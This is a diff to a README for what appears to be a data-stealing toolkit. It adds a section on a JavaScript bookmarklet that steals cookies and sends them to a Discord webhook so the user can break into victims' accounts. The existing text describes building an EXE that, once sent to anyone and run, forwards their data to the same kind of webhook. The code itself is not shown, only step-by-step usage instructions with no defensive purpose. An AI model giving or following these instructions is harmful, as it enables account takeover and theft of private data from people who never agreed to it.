@@ -12,3 +12,6 @@ pip install discord-webhook browser-cookie3 psutil browser-history chrome-bookma
 ```
 Then, you can find the ScriptConfig.py script in GeneralTools and run it.
 When you run it, you'll be asked for a discord webhook. You'll need to make one, and then paste the url into the script when it asks you. You will then get an EXE file in the dist folder. You can then send this file to anyone, and when they run it, you'll have all their stuff in the discord webhook channel. Have fun and use responsibly!
+### - Javascript Bookmarklet Cookie Stealer
+This script will steal anyones cookies the second they click the bookmarklet! (After you convert it to a bookmarklet. You can find bookmarklet makers on Google.)
+To use, simply setup a discord webhook, paste it into the CookieStealerBookmarklet.js script located in JavascriptTools, convert it into a bookmarklet, and add it into someones bookmarks! When they click it, you'll recieve their cookies, which you can use to get into their accounts!
